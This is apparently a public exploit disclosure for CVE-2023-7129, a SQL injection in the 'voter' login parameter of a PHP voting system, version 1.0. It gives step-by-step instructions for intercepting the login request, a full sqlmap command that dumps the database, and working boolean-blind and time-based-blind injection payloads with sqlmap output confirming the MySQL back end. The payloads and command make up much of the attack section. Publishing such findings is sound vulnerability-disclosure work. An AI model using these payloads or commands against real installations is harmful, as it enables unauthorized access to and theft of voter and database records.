# CVE-2023-7129_Voting_System-SQL_Injection-2
+ **Exploit Title:** CVE-2023-7129_Voting_System-SQL_Injection-2
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/voting-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/02/VOTING_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2023-7129

## References: 
+ **CVE-2023-7129:** https://vuldb.com/?id.249132
+ https://www.cve.org/CVERecord?id=CVE-2023-7129
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7129

## Description:
Voting System 1.0 allows SQL Injection via parameter 'voter' in "/votesystem/". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the voters login page: "http://localhost/votesystem/"
+ Fill the voter id and password then click 'Sign In' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Use sqlmap to exploit. In sqlmap, use 'voter' parameter to dump the database. 
```
sqlmap -r r.txt -p voter --risk 3 --level 5 --threads 1 --random-agent tamper=between, randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: voter (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: voter=11111' OR NOT 1116=1116-- lQWF&password=pass&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: voter=11111' AND (SELECT 4895 FROM (SELECT(SLEEP(5)))tJOZ)-- AnqV&password=pass&login=
---
[18:59:39] [INFO] testing MySQL
[18:59:39] [INFO] confirming MySQL
[18:59:39] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[18:59:39] [INFO] fetching current database
[18:59:39] [INFO] resumed: votesystem
current database: 'votesystem'
```

+ current database: `votesystem`
![2](https://github.com/h4md153v63n/CVEs/assets/5091265/c0550210-c182-4df0-a091-73366fbaa1f2)
